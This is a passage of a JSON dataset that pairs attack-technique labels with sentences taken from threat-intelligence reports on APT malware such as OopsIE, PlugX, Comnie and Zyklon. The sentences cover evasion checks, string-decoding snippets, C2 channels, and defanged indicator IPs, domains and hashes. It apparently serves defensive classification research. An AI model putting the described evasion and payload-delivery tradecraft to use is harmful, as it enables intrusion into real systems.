        "Timezone Check The Trojan check to see if the system is configured (\u201cDaylightName\u201d) with one of the following time zones: \u00a0 Arabic Daylight Time (UTC+3) Arab Daylight Time (UTC+3) Arabian Daylight Time (UTC+4) Middle East Daylight Time (UTC+2) Iran Daylight Time (UTC+3.5)   Human Interaction Check Before executing its functional code, the Trojan presents a dialog box with the following line of code: \u00a0 Interaction.MsgBox(encodedStringClass.return_user32_bogus_errorcode_(3), MsgBoxStyle.Critical, null); \u00a0 This dialog box displays \u00a0An error occurred while processing user32.dll!, which the user must click the ok button for the Trojan to run its functional code",
        "The last technique that was particularly interesting is the time zone check, as the Trojan will not execute its functional code if the system does not have a specific time zone set",
        "Figure 3 Countries in which OopsIE will run in based on the time zone Notable Differences The OopsIE Trojan delivered in this attack had functional code that was very similar to the OopsIE variant discussed in our previous blog",
        "In another case the attackers use another code snippet borrowed from the SubTee GitHub project, this time filling in a fully templated .NET application whitelist bypass file: SHA256: 3e9136f95fa55852993cd15b82fe6ec54f78f34584f7689b512a46f0a22907f2: This time the attacker didn\u2019t have to write any of their own code, instead they were simply able to paste their shellcode directly into a template, in order to launch PlugX as a child process of a trusted application",
        "Watches uninstall time, checks time diff (local time vs internet time)"
    ],
    "deobfuscate/decode files or information": [
        "Here\u2019s a python code to decode",
        "The shellcode decodes and decompresses another DLL, which is an updated variant of UPPERCUT",
        "Figure 2: Exploit Shellcode used to Locate and Decode Payload The shellcode (Figure 2) searches for and decodes the executable payload contained in memory between the beginning and ending file markers 0xBABABABA and 0xBBBBBBBB, respectively",
        "This function is able to obfuscate code so that every iteration of the code is presented differently",
        "It then downloads and decrypts a PNG file",
        "The state command sets a global variable containing a series of Boolean values represented as ASCII values \u20180\u2019 or \u20181\u2019 and also adds itself to the configuration file",
        "The code comparison specifically shows the HighShell code including a salt variable containing di2zag7wZHTK9YR0NGq, which is not present within the TwoFace code on the left",
        "Comnie continues to load an embedded bitmap (BMP) file and decrypt data at offset 0x512",
        "Figure 11 Embedded BMP file containing encrypted string data RC4 is used to decrypt this data using a 16-byte key that is stored within the BMP file at offset 0x502",
        "Once decrypted, we are provided with a large list of strings, as seen below (note that the data has been truncated for brevity):  Figure 12 Decrypted strings from embedded BMP file After these strings are decrypted, the malware will load a series of Microsoft Windows API calls to be used later on",
        "In order to decode this data, Comnie first decodes it using base64 with the following non-standard alphabet (note that it is simply the original alphabet in reverse): /+9876543210zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA \u00a0 The resulting data is then parsed and decrypted using RC4",
        "Here is the code:The goal of this code is to get information from the properties of the document (\"Subject\", \"Company\", \"Category\", \"Hyperlink base\" and finally \"Comments\")",
        "The subdomain 676f6f646c75636b is a hex encoded string which decodes to goodluck",
        "This DLL serves three main functions: killing antimalware, unpacking and executing the main RAT DLL, and obtaining persistence",
        "The final antidebugging technique involves GetTickCount performance counters, which are placed within the main sections of code to detect any delay a debugger adds during runtime",
        "Even if the arsenal of this actor is diverse, we have identified some patterns, copy-paste code from various public repositories and similarities between the different piece of code",
        "Its purpose is to load Msadoz<n>.dll in order to decrypt and execute it in memory",
        "If after the package has been decoded its size is bigger than 3 bytes, the Trojan decrypts its first 11 bytes with XOR using the method similar to the one described above",
        "The decrypted code resolves the necessary API functions, decompresses the embedded PE file with RtlCompressBuffer() using LZNT1 and maps it into memory",
        "The Visual Basic macro performs the following tasks:  Opens a handle to the malicious document to read the encoded CAB file Decodes the CAB file and writes it to the disk at %temp%\\setup.cab   Encoded CAB file in the Word document",
        "Configuration Decryption:  Another small, but same important function in the photo above, is the function for decrypting the data containing the C&C configuration",
        "The MirageFox binaries export a function called dll_wWinMain, the name of an export in vsodscpl.dll, a module by McAfee that is loaded by a few of their executables that import and call this function",
        "The most interesting part is the decrypted C&C configuration, as can be seen in the image below",
        "Figure 2 \u2013 The GitHub profile for F0R3X containing both legitimate forked code and the binaries created by the attacker",
        "It also allows macro code to access internal VBA objects for stealthier macro code execution in future attacks",
        "Backdoor analysis The main loop of the backdoor has two main functions, infoClient and runHandle",
        "Packet::getData decrypts the received payload and Converter::outString descrambles the result",
        "In the event this is successful the malware will use the following path to store any dropped files:  %COMMONPROGRAMFILES%\\services\\  In the event it is not successful, this alternative path will be used instead:  %APPDATA%\\microsoft\\mmc\\  It proceeds to load and decrypt and embedded bitmap resource file",
        "In the event this is successful, the malware will use the following path to store any dropped files:  %COMMONPROGRAMFILES%\\services\\  In the event it is not successful, this alternative path will be used instead:  %APPDATA%\\microsoft\\mmc\\  Reaver.v2 proceeds to decrypt an embedded file using a simple XOR obfuscation routine",
        "The malware proceeds to decrypt and embedded configuration of 128 bytes using a simple XOR routine",
        "ESET\u2019s analysis of a recent backdoor used by TeleBots \u2013 the group behind the massive NotPetya ransomware outbreak \u2013 uncovers strong code similarities to the Industroyer main backdoor, revealing a rumored connection that was not previously proven The post New TeleBots backdoor: First evidence linking Industroyer to NotPetya appeared first on WeLiveSecurity",
        "The following code snippet was used to decode strings within OopsIE:out = \"\" for e in obfuscated_string.split(\"-\"):    out += chr(int(e)-1)When first run, this OopsIE variant runs a variety of checks to avoid running in an analysis environment, as discussed in the previous section",
        "This exception invokes the exception handler containing the HTTP communication code, allowing it to run",
        "Figure 1 \u2013 The main code from the .NET wrapper, with the Shellcode array being created and executed in a new thread",
        "The first shellcode decrypts a further shellcode block",
        "After decrypting the strings, they must be further decompressed using LZNT1",
        "It then reads and decrypts the content between these values to yield an IP address as shown below:       ---- BEGIN SSH2 PUBLIC KEY ----Comment: \"rsa-key\"AAAAB3NzaC1yc2EAAAABJQAAAQEAhLxZe4Qli9xt/WknQK9CDLWubpgknZ0HIHSd8uV/TJvLsRkjpV+U/tMiMxjDwLAHVtNcww2h8bXTtw387M2Iv/mJjQ9Lv3BdNiM3/KvmlpeJZrrFu2n5UC9=DZKSDAAADOECEDFDOCCDEDIDOCIDEDOCHDDZJS=oT+Ps8wD4f0NBUtDdEdXhWp3nxv/mJjQ9Lv3BCFDBd09UZzLrfBO1S0nxrHsxlJ+bPaJE2Q/oxLXTrpeJ6AHyLyeUaBha3q9niJ=---- END SSH2 PUBLIC KEY ----     A Python script to decode strings encrypted with this technique is given in Appendix B \u2013 Python Scripts",
        "To decode this information, BADNEWS takes the following steps:  Base64-decode the string Perform the decoding cipher used in previous versions Base64-decode the result Decrypt the result using the Blowfish algorithm and a static key  A script, which is included in the Appendix, will decrypt data from these dead drop resolvers",
        "Interestingly, the delivery document borrowed a technique which was publicized in late 2017 as being used by the Sofacy threat actors, embedding the main malicious code in a EXIF metadata property of the document",
        "The main function of the Trojan interacts with its configured C2 server to obtain additional code to execute",
        "The main function gets pertinent strings to communicate with its C2 by calling a sub-function with a specific number that the sub-function uses as a case within a switch statement to decrypt the desired string",
        "We believe the actor used a cryptor on the payload, as it obtains a filename and script from within its resources and decodes these resources by multiplying each byte by negative one",
        "The payload then uses the MD5 hash (14331d289e737093994395d3fc412afc) of what appears to be a hardcoded SHA1 hash (B6A75B1EF701710D7AEADE0FE93DE8477F3BD506) as an RC4 key to decrypts the resulting decoded data",
        "The unique strings mainly consist of \u201cMobile/BADDAD\u201c, \u201cMobile/7B405\u201d and \u201cE9BC3BD76216AFA560BFB5ACAF5731A3\u201d",
        "\u201cKnock\u201d also appears in several strings inside the code of SpeakUp",
        "Indicators  File  Hash  Description  x.js  3fefa55daeb167931975c22df3eca20a  HOMEFRY, a 64-bit Windows password dumper/cracker  mt.exe  40528e368d323db0ac5c3f5e1efe4889  MURKYTOP, a command-line reconnaissance tool\u00a0  com4.js  a68bf5fce22e7f1d6f999b7a580ae477  AIRBREAK, a JavaScript-based backdoor which retrieves commands from hidden strings in compromised webpages   Historical Indicators  File  Hash  Description  green.ddd  3eb6f85ac046a96204096ab65bbd3e7e  AIRBREAK, a JavaScript-based backdoor which retrieves commands from hidden strings in compromised webpages  BGij  6e843ef4856336fe3ef4ed27a4c792b1  Beacon, a commercially available backdoor  msresamn.ttf  a9e7539c1ebe857bae6efceefaa9dd16  PHOTO, also reported as Derusbi  1024-aa6a121f98330df2edee6c4391df21ff43a33604  bd9e4c82bf12c4e7a58221fc52fed705  BADFLICK, backdoor that is capable of modifying the file system, generating a reverse shell, and modifying its command-and-control configuration",
        "It maintains both code and data in the raw, encrypted blobs of data to be decrypted and used at runtime, and hidden functionality that isn\u2019t exposed until runtime",
        "No pdb/debug strings are present in the code",
        "In total, 29 unique CARROTBAT samples have been identified to date, containing a total of 12 confirmed unique decoy documents",
        "In this particular instance, the payload is encoded via base64, which certutil decodes",
        "The following function written in Python may be used to decode this file:def decode(data): \tout = \"\" \tc = 0 \tfor d in data: \t\tout += chr(ord(d)^c) \t\tc+=1 \treturn outOnce decoded it is discovered that this instance of OceanSalt attempts to communicate with 61.14.210[.]72 on port 7117",
        "The following code example shows the false flag being set (5 > 115) and the ETransaksi.diomadnfagaghagh method being called: \u00a0int num = 5; int num2 = 155; bool flag = num > num2; if (flag) {     <legitimate Sales System Application code>     }            else {     NewLateBinding.LateCall(ETransaksi.diomadnfagaghagh(), null, \"Invoke\", new object[]     {         null,         new object[0]     }, null, null, null, true);The payload uses this technique to run a chain of methods that eventually carry out its malicious task",
        "(Source: Dell SecureWorks) Both the redirect code on the compromised site and the exploit code appear and disappear, indicating that the adversaries add the code when they want to leverage the SWC and remove the code when it is not in use to limit the visibility of their operations",
        "The decrypted contents of the log file adhere to the format in Figure 22",
        "Decrypted OwaAuth log file format",
        "The backdoor will load the encrypted configuration file and decrypt it, then use Secure Sockets Layer (SSL) protocol to connect to command-and-control (C&C) servers",
        "Malicious document used by Tropic Trooper PDB Strings as Context Clues The MSI file has two program database (PDB) strings inside: one belonging to the MSI file, and another for the backdoor installer (detected by Trend Micro as TROJ_TCDROP.ZTFB)",
        "The image and table below illustrate TClient\u2019s encrypted configuration that we decrypted (via Python code):  Figure 10",
        "Snapshot of code we used to decrypt TClient\u2019s configuration   Figure 11",
        "Decrypted backdoor configuration Reverse analysis of TClient allowed us to determine how to decrypt the C&C information"
    ],
    "disabling security tools standard application layer protocol system network configuration discovery-multi": {
        "technique_names": [
            "disabling security tools",
            "standard application layer protocol",
            "system network configuration discovery"
        ],
        "sentances": [
            "- Shusei Tomonaga (For any inquiry or incident report regarding PlugX, please contact info[at]jpcert.or.jp)  Appendix A: Entire Configuration of P2P PlugX Table 3: Entire Configuration of P2P PlugX   Offset Length Description   0x0000 20 Not used   0x0014 4 Flag if remove own DLL from list of modules   0x0018 4 Flag enable/disable key logger   0x001c 12 Not used   0x0028 4 Duration of suspend activity   0x002c 4 Duration of suspend activity   0x0030 672 Network Access Flag (for a week with 15min interval)   0x02d0 4 * 4 DNS Server IP Address x 4   0x02e0 68 * 16 control Server Information x 16   0x0720 128 * 16 HTTP Access URL x 16   0x0f20 196 * 4 Proxy/authentication config x 4   0x1230 4 Method to make it resident (e.g"
        ]
    },
    "new service": [
        "Create Service",
        "Further collaboration between FireEye as a Service (FaaS), Mandiant and FireEye iSIGHT intelligence uncovered additional victims worldwide, a new suite of tools and novel techniques",
        "In addition, web traffic between a service provider\u2019s customer and a service provider is likely to be viewed as benign by network defenders at the customer, allowing the attacker to exfiltrate data stealthily",
        "This effectively routes SOGU malware traffic through the victim\u2019s service provider, which likely indicates a foothold on the service provider\u2019s network",
        "These parameters install it as a service",
        "The malware operates on victims\u2019 systems as a svchost-based service and is capable of downloading executables, changing its own configuration, updating its own binaries, terminating its own processes, and activating and terminating denial-of-service attacks",
        "The malicious DLL is not a service DLL because it lacks ServiceMain()",
        "The victims Data from Cadelle\u2019s C&C servers shows that a large number of Backdoor.Cadelspy infections affected individual users of Iranian internet service providers (ISPs) and hosting services",
        "\"Are you Happy?\" campaign.\"FreeMilk\" campaign.\"North Korean Human Rights\" campaign.\"Evil New Year 2018\" campaign.On January 2nd of 2018, the \"Evil New Year 2018\" was started",
        "The document brought Talos a new gift - a new version of ROKRAT",
        "Figure 2: AuditCred/ROptimizer Service If successfully installed, this particular backdoor poses quite a threat to its target",
        "BootComplete\u00a0starts the\u00a0AutoStartup\u00a0service and the\u00a0AutoStartup\u00a0service makes sure that\u00a0MainActivity\u00a0is always\u00a0running"
    ],
    "disabling security tools registry run keys / startup folder bypass user account control-multi": {
        "technique_names": [
            "disabling security tools",
            "registry run keys / startup folder",
            "bypass user account control"
        ],
        "sentances": [
            "Create Run Key)   0x1234 512 Folder to Install   0x1434 512 Service Name   0x1634 512 Service Display Name   0x1834 512 Service Description   0x1a34 4 Registry Root Key Value for Run Registry Key Configuration   0x1a38 512 Run Registry Key Name   0x1c38 512 Run Registry Key Value   0x1e38 4 Enable/Disable Code injection   0x1e3c 512 * 4 Program Name for Code Injection x 4   0x263c 4 Enable/Disable Code injection for UAC Bypass   0x2640 512 * 4 Program Name to inject code for UAC Bypass x 4   0x2e40 512 Authentication Character String for PlugX   0x3040 512 Authentication Character String for C&C Server   0x3240 512 Mutex Name   0x3440 4 Enable/Disable Screen Capture   0x3444 4 * 5 Screen Capture Configuration Value   0x3458 528 Folder to Store Screen Captures   0x3658 4 Enable/Disable P2P(TCP)   0x365c 4 P2P(TCP) Port Number   0x3660 4 Enable/Disable P2P(UDP)   0x3664 4 P2P(UDP) Port Number   0x3668 4 Enable/Disable P2P(ICMP)   0x366c 4 P2P(ICMP) Port Number   0x3670 4 Enable/Disable P2P(IP Protocol Number 255)   0x3674 4 P2P(IP Protocol Number 255) Port Number   0x3678 4 Enable/Disable P2P Scanning   0x367c 4 * 4 P2P Scanning Beginning Address x 4   0x368c 4 * 4 P2P Scanning End Address x 4   0x369c 6 Run program if this MAC Address is used   0x36a2 2 Not used    Appendix B: \u00a0SHA-256 hash value of P2P PlugX  bc65e2859f243ff45b12cd184bfed7b809f74e67e5bb61bc92ed94058d3d2515 93c85a8dd0becc4e396eea2dc15c0010ff58d2b873d44fd7e45711a27cfe613b 0ff134057a8b2e31b148fedfdd185f5b1a512149499a8c5c0915cf10b10a613e         \u671d\u9577 \u79c0\u8aa0 (Shusei Tomonaga)  Since December 2012, he has been engaged in malware analysis and forensics investigation, and is especially involved in analyzing incidents of targeted attacks"
        ]
    },
    "remote file copy": [
        "HAYMAKER is a backdoor that can download and execute additional payloads in the form of modules",
        "It downloads the file to the infected machine from the input URL using BITSAdmin, and is called every time the script attempts to download a file",
        "The XSL script contains additional hard coded variables sVarRaz and sVar2RazX, which contain file paths that direct to the downloaded files.\u00a0  The file\u2019s path",
        "The directory creation.\u00a0 Downloading the Payloads The remote XSL script downloads twelve files from the C2 server that masquerade themselves as JPEG, GIF, and extensionless files",
        "A thorough explanation of what information is collected can be found in a breakdown by Cofense from late 2018.\u00a0  The script verifies all parts of the malware have been downloaded.\u00a0 After downloading the payload, the XSL script checks to make sure every piece of the malware was downloaded.\u00a0  One of the twelve download commands as detected by the Cybereason platform in same variant of Astaroth.\u00a0  The twelve downloaded files",
        "The config file provides download instructions for the loader",
        "Displayed below are these new, xml formatted plugin names \u201cweap_hwi\u201d, \u201cps\u201d, and \u201cvsnet\u201d in a BlackEnergy configuration file download from a c2 server",
        "One of the discovered config files contained a URL with an as yet unidentified md5: hxxps://46.165.222(dot)28/upgrade/bf0dac805798cc1f633f19ce8ed6382f/upgrade.php Victim set #4 A set of victims discovered\u00a0installed Siemens SCADA software in their ICS environment was responsible for downloading and executing BlackEnergy",
        "HighShell v5.0 explorer tab allows actor to navigate the file system The HighShell v7.1 variant from the data dump contains similar functionality to its predecessors and continued the tabular approach but expanded even further by splitting out the main functionality across multiple tabs, specifically \u201cCommand\u201d, \u201cExplorer\u201d, \u201cUpload\u201d, \u201cDownload\u201d, \u201cSql Server\u201d and \u201cChange Time\u201d",
        "Network Downloader The Network Downloader functionality allows the actor to quickly upload user files from remote victim systems",
        "The sample, in the form of an RTF document, exploited CVE-2016-4117 to download and install a program from a remote C&C server",
        "Symantec determined a more accurate picture of Buckeye\u2019s targets by looking at where Buckeye remained active on the network longer than a day, deployed additional tools, and spread onto multiple computers",
        "The BITS mechanism has existed since Windows XP up to the current Windows 10 versions and was developed to create download/upload jobs, mostly to update the OS itself",
        "It uses the Dropbox API with a hardcoded bearer access token and has the ability to download, upload, and execute files",
        "Using this information, they can decide to explore further or instruct the compromised computer to download additional malware",
        "In this case, after the payload is delivered via an exploit the threat actor places files (named upload.bat, upload.rar, and period.txt, download.txt or silent.txt) in a directory on a Dropbox account",
        "Upon execution, the initialized file downloads multiple malicious payloads from remote servers",
        "Figure 4 Microsoft Word attempting to download the remote template If the C2 server is active at the time the document is opened, it will successfully retrieve the malicious macro and load it in the same Microsoft Word session",
        "If the C2 server is not active at this time, the download will fail and the victim will not receive a prompt to Enable Content as no macro is downloaded",
        "attachedTemplate.dotm xxx 11/15/18 05:35 11/15/18 05:35 109.248.148[.]42    Table 2 Remote templates downloaded by Dear Joohn delivery documents As seen in Table 1, the delivery documents accessed their respective remote templates from four C2 servers at the following IP addresses:  185.203.118[.]198 145.249.105[.]165 188.241.58[.]170\u00a0 109.248.148[.]42  These initial C2 IP addresses not only hosted the remote templates that subsequently load the first-stage Zebrocy or Cannon payloads, but the IP addresses also hosted the C2 server for the first-stage payloads themselves",
        "The POSHSPY backdoor is designed to download and execute additional PowerShell code and Windows binaries",
        "If the user clicks on the link, he will be prompted to download a RAR file that contains the stage 1 malware/lure, which he will execute afterwards",
        "The executable attempts to download a couple of files from different sources and saves them in the AppData and Startup folders for persistence, then invokes the first downloaded file \u2013 Picture2.exe",
        "The RAT, however, had a multitude of functionalities (as listed in the table below) such as to download and execute, compress, encrypt, upload, search directories, etc",
        "The link provided in the malicious email led to a fake\u00a0VPN Web Portal:  Upon logging in with the credentials provided in the email, the victim is presented with the following page:  The victim is asked to install the \u201cVPN Client\u201d (an .exe file), or, if download fails, to download a password protected zip (with the same .exe file inside)",
        "This document was alleged to have been written by the Ministry of Reunification as demonstrated by the logo in the top left.Similar to the \"Golden Time\" campaign, this document exploits an EPS vulnerability in order to download and execute shellcode located on a compromised website:hxxp://60chicken[.]co[.]kr/wysiwyg/PEG_temp/logo1.pngThe fake image usage is a common pattern for this group",
        "The macro contains malicious code that attempts to download content from a remote server",
        "!DWN  Downloads a file from a specified URL",
        "Responds to the IRC server via PRIVMSG with \u201cDownload\u00a0 Success :FilePath=<path to downloaded file>\u201d or \u201cDownload Fail\u201d if unsuccessful",
        "The IRC variant of MPK has a command set (Table 2) that makes this an effective backdoor Trojan, specifically allowing the actors to steal credentials from the targeted system via keylogging, to navigate and interact with the file system, to run arbitrary commands, and to download and execute additional tools on the system",
        "It exploits CVE-2017-0199 to download the second stage payload from 193.23.181.151 (Figure 3)",
        "Figure 4: Downloading second stage Seminar.rtf The downloaded Seminar.rtf contains an embedded binary file that is dropped in %temp% via Equation Editor executable",
        "Zyklon is a publicly available, full-featured backdoor capable of keylogging, password harvesting, downloading and executing additional plugins, conducting distributed denial-of-service (DDoS) attacks, and self-updating and self-removal",
        "The DOC file contains an embedded OLE Object that, upon execution, triggers the download of an additional DOC file from the stored URL (seen in Figure 3)",
        "Upon opening the malicious DOC attachment, an additional download is triggered from a stored URL within an embedded OLE Object (seen in Figure 4)",
        "Figure 4: Embedded URL in OLE object    Figure 5: HTTP GET request to download the next level payload The downloaded file, doc.doc, is XML-based and contains a PowerShell command (shown in Figure 6) that subsequently downloads the binary Pause.ps1",
        "Figure 8 shows the network communication of the Pause.ps1 download",
        "Figure 8: Network communication to download the Pause.ps1 payload Zyklon Delivery In all these techniques, the same domain is used to download the next level payload (Pause.ps1), which is another PowerShell script that is Base64 encoded (as seen in Figure 8)",
        "I download my tools from GitHub, and so do my victims",
        "The \u201cupload\u201d command downloads files from the CnC and saves them locally in \u201cC:\\ProgramData\u201c",
        "Additional information In the advanced stages of this research, we were able not only to observe additional files and tools from the attackers\u2019 arsenal but also some OPSEC mistakes made by the attackers",
        "It will:  Download and execute the backdoor component Replace the content of the downloader Mach-O executable with a decoy, either using a base64-encoded embedded file or by downloading it from the internet Open a decoy document (described later) Close the Terminal window that just opened  The decoy document replaces the downloader Mach-O file, which means the malicious executable is only present in the ZIP file now",
        "This file issued a GET request to download a malicious file from: hxxp://94.23.172.164/dupdatechecker.doc",
        "As shown in Figure 12, the script within the dupatechecker.doc file attempts to download another file named dupatechecker.exe from the same server",
        "Anyconnect[.]stream Bigip[.]stream Fortiweb[.]download Kaspersky[.]science microtik[.]stream owa365[.]bid symanteclive[.]download windowsdefender[.]win  The listed C2 servers all resolved to IPs belonging to a service provider in China at 1.2.9.0/24, which is the IP address used by the C2 server to send a cancel communications message to the end system",
        "The .iqy files take advantage of Excel\u2019s willingness to download and include the contents from a remote server in a spreadsheet",
        "2 Downloads a file to the system",
        "Once the victim downloads and executes the email attachment, it runs silently with no additional decoy documents or decoy dialog boxes",
        "This includes, but is not limited to, the following:  AES encryption of network communication File management Functionality to download, upload, and execute files Keylogging Remote desktop access Remote webcam viewing Reverse proxy Browser and FTP client password recovery  The images below are what a target user opening a malicious RTF document would see from within Microsoft Word",
        "13 Copy file to adbFle.tmp, and upload it to the C2",
        "When opened and then executed, the key components of the HTA file downloads and executes further malware from a remote URLand loads a decoy image hosted externally (Figure 3)",
        "Both responses instruct the malware to download and load a remote plugin",
        "During a file analysis of PLAINTEE in WildFire, we observed the attackers download and execute a plugin during the runtime for that sample",
        "Most of them manipulate the machine to download and execute different files",
        "Use of PowerShell to download additional tools",
        "The purpose is to download and execute an additional payload hosted on a compromised website: NavRAT",
        "NavRAT is able to download and execute files located in the attachment of a received email",
        "The shellcode of the embedded object is designed to download an image, which is, in fact, a new shellcode used to decode an embedded executable",
        "Figure 2 SYSCON network traffic witnessed during execution \u00a0 Pivoting on the domain hosting the SYSCON sample, 881.000webhostapp[.]com, revealed a number of additional samples, including a sample of the KONNI malware family, and four 64-bit executable files belonging to the CARROTBAT malware family",
        "CARROTBAT itself is a dropper that allows an attacker to drop and open an embedded decoy file, followed by the execution of a command that will download and run a payload on the targeted machine",
        "Delivery document The delivery document contains a macro that downloads an executable from a remote server",
        "Command_Down_exec: This command downloads and executes new modules.\u00a0 It takes a url as the argument and uses that to download and execute files",
        "Its presence on a compromised system allows a threat actor to spawn a reverse shell, upload or download files, and capture keystrokes",
        "After reestablishing access, the adversaries download tools such as gsecudmp and WCE that are staged temporarily on websites that TG-3390 previously compromised but never used",
        "The OwaAuth web shell enables a threat actor to upload and download files, launch processes, and execute SQL queries",
        "The script self-scheduling, as well as the scheduling of a script that repeatedly attempts to download and execute the Revenge RAT binary, significantly contribute to the persistence of this infection",
        "A backdoor that communicates with a single command and control (C2) server using HTTP GET and POST requests, TONEDEAF supports collecting system information, uploading and downloading of files, and arbitrary shell command execution.",
        "We found a mechanism for decrypting, executing, and downloading an additional payload from the C&C server.",
        "",
        "certutil is a WIndows component that can download external content to the computer. In a typical attack, the criminals follow this paradigm",
        "The SQLRat script is designed to make a direct SQL connection to a Microsoft database controlled by the attackers and execute the contents of various tables",
        "The backdoor has the capability to download and upload files, execute shell commands, and update its configuration."
    ],
    "system information discovery standard application layer protocol-multi": {
        "technique_names": [
            "system information discovery",
            "standard application layer protocol"
        ],
        "sentances": [
            "It communicates encoded system information to a single hard coded command and control (C2) server, using the system\u2019s default User-Agent string"
        ]
    },
    "dll search order hijacking": [
        "BUGJUICE is a backdoor that is executed by launching a benign file and then hijacking the search order to load a malicious dll into it",
        "This most likely means there is some type of DLL hijacking going on by distributing a legitimate McAfee binary with MirageFox to load up the DLL properly into a legitimate looking process",
        "Whitefly has consistently used a technique known as search order hijacking to run Vcrodat.",
        "Attackers can therefore give a malicious DLL the same name as a legitimate DLL but place it ahead of the legitimate version in the search order so that it will be loaded when Windows searches for it.",
        "Nibatad is also a loader that leverages search order hijacking, and downloads an encrypted payload to the infected computer."
    ],
    "standard application layer protocol": [
        "BUGJUICE defaults to TCP using a custom binary protocol to communicate with the C2, but can also use HTTP and HTTPs if directed by the C2",
        "SNUGRIDE is a backdoor that communicates with its C2 server through HTTP requests",
        "We mentioned earlier that due to the nature of the IE injection technique used by the HTTP-based backdoors, a number of C2 commands were cached to disk",
        "And, according to the collected config files, the group upgraded their malware communications\u00a0from plain text http to encrypted https in\u00a0October 2013",
        "Figure 1: Configuration file that adds new C2 server and forces the data-stealing backdoor to use it   Figure 2: Configuration file that adds TCP tunnels and records desktop video Command and Control CARBANAK communicates to its C2 servers via pseudo-HTTP or a custom binary protocol",
        "Pseudo-HTTP Protocol Messages for the pseudo-HTTP protocol are delimited with the \u2018|\u2019 character",
        "We recently mentioned this tool in another report on April 16, as this variant of the BONDUPDATER tool used DNS tunneling to communicate with its C2, specifically using TXT queries to receive information from the C2 server",
        "Server Command and control server that communicates via DNS tunneling   Panel Graphical User Interface that allows actors to issue commands, upload and download files to Agents via the Server    Table 2",
        "The Poison Frog server handles both the HTTP and DNS tunneling channels used by the hUpdater.ps1 and dUpdater.ps1 scripts",
        "Its C2 is based on IIS using .asp technology to handle the victims\u2019 HTTP requests",
        "The example C2s used by older variants of Comnie demonstrates this:  Figure 9 Old Comnie variants collecting C2 information Please refer to the Appendix for a script that may be used to decode C2 information from the older Comnie variants",
        "After Comnie collects the remote C2 information, it will communicate with these remote servers using HTTP requests",
        "The URIs used in the HTTP requests are randomly generated",
        "Table 2 Sandbox evasion checks in the C# variant of RogueRobin Like the original version, the C# variant of RogueRobin uses DNS tunneling to communicate with its C2 server using a variety of different DNS query types",
        "Figure 2 Code that issues DNS query to gogle.co if a debugger is detected All DNS requests issued by RogueRobin use the built in nslookup.exe application to communicate to the C2 server and the Trojan will use a variety of regular expressions to extract data from the DNS response",
        "Character  Digit   h 0   i 1   j 2   k 3   l 4   m 5   n 6   o 7   p 8   q 9    Table 4 Character substitution used in RogueRobin The Trojan will use future DNS requests to retrieve jobs from the C2 server, which the Trojan will handle as commands",
        "The x_mode command is disabled by default, but when enabled via a command received from the DNS tunneling channel, it allows RogueRobin to receive a unique identifier and to get jobs by using Google Drive API requests",
        "Background From October 2012 to May 2014, FireEye observed APT12 utilizing RIPTIDE, a proxy-aware backdoor that communicates via HTTP to a hard-coded command and control (C2) server",
        "If you compare the HTTP GET request from the RIPTIDE samples (Figure 1) to the HTTP GET request from the HIGHTIDE samples (Figure 3) you can see the malware author changed the following items:  User Agent Format and structure of the HTTP Uniform Resource Identifier (URI)   Figure 3: HIGHTIDE GET Request Example Similar to RIPTIDE campaigns, APT12 infects target systems with HIGHTIDE using a Microsoft Word (.doc) document that exploits CVE-2012-0158",
        "Similar to RIPTIDE and HIGHTIDE, the WATERSPOUT backdoor is an HTTP-based backdoor that communicates with its C2 server",
        "11/1/18 sahro.bella7 trala.cosh2 Bishtr.cam47 Lobrek.chizh Cervot.woprov    Table 5 Gathered C# Cannon samples As mentioned in our initial blog, the actor controlled email address acting as the C2 was sahro.bella7[at]post.cz, but all previous samples of Cannon used sym777.g[at]post.cz",
        "Even though Delphi Cannon uses POP3S and SMTPS for its C2 communications like Cannon, it is arguably easier to defend against as it uses an actor owned domain that defenders can easily block and not a legitimate email provider such as Seznam",
        "The screenshot in Figure 8 of the inf method within a Cannon sample (SHA256: 4405cfbf28\u2026) shows the information gathered that is exfiltrated to the C2 via email, specifically with RunningPlace and LogicalDrives header strings:  Figure 8 inf method used by Cannon When comparing the two Cannon variants, we found a method within a Delphi Cannon sample (SHA256: 5a02d4e5f6\u2026) showing the use of Running place and Logical_Drivers as header strings to the system information it is collecting and sending to the C2 via email",
        "The shellcode retrieves an additional payload by connecting to the following C2 server using DNS: aaa.stage.14919005.www1.proslr3[.]com Once a successful reply is received from the command and control (C2) server, the PowerShell script executes the embedded Cobalt Strike shellcode",
        "Later variants upload the file to a web server via an HTTP post command",
        "Retriever uses .NET web services and the SoapHttpClientProtocol class to communicate with its C2 server, which generates HTTP requests resembling the example request in Figure 4",
        "The shellcode executed by this command is the same as in the delivery documents as well, specifically taken from Metasploit to obtain additional shellcode to execute using an HTTP request to the following URL: http://www7.chrome-up[.]date/0m5EE We are unsure of the shellcode hosted at this URL, as we were unable to coerce the C2 server to provide a payload",
        "Once these variables are set, the malware uses the SoapHttpClientProtocol class to communicate with its C2 server, which issues an HTTP POST requests that appears as:  As you can see from the above request, the SoapHttpClientProtocol class neatly structures data into an HTTP POST request",
        "All subsequent interaction with the C2 server uses the same SOAP web service, so we will not show all of the generated HTTP requests",
        "Figure 9: Command logs after execution Network Communications FELIXROOT communicates with its C2 via HTTP and HTTPS POST protocols",
        "Table 3: FELIXROOT backdoor parameters  Cryptography All data is transferred to C2 servers using AES encryption and the IbindCtx COM interface using HTTP or HTTPS protocol",
        "Previous related research: https://sec0wn.blogspot.com/2018/05/clearing-muddywater-analysis-of-new.html?m=1 https://reaqta.com/2017/11/muddywater-apt-targeting-middle-east/ https://blog.malwarebytes.com/threat-analysis/2017/09/elaborate-scripting-fu-used-in-espionage-attack-against-saudi-arabia-government_entity/ https://www.sekoia.fr/blog/falling-on-muddywater/  Decoy images by country Jordan     The Hashemite Kingdom of Jordan, Ministry of Justice (mwjo.doc) DAMAMAX.doc    Turkey     Turkey\u2019s General Directorate of Security Turkey\u2019s Directorate General of Coastal Safety        Turkey\u2019s General Directorate of Security (Onemli Rapor.doc) Turkey\u2019s Ministry of the Interior (Early election.doc)    Saudi Arabia Document signed by the Major General Pilot, commander of the Saudi Royal Air Force     KSA King Saud University (KSU) KSA King Saud University (KSU)    Azerbaijan \u0130nki\u015faf \u00fc\u00e7\u00fcn g\u00f6r\u00fc\u015f.doc (meeting for development) Iraq     Iraqi Ministry of Foreign Affairs Government of Iraq, the Treasury of the Council of Ministers    Pakistan     ECP.doc National Assembly of Pakistan.doc        P.Police.doc     Afghanistan President.doc, E-government of Afghanistan Technical details Below is a description of the malware extraction and 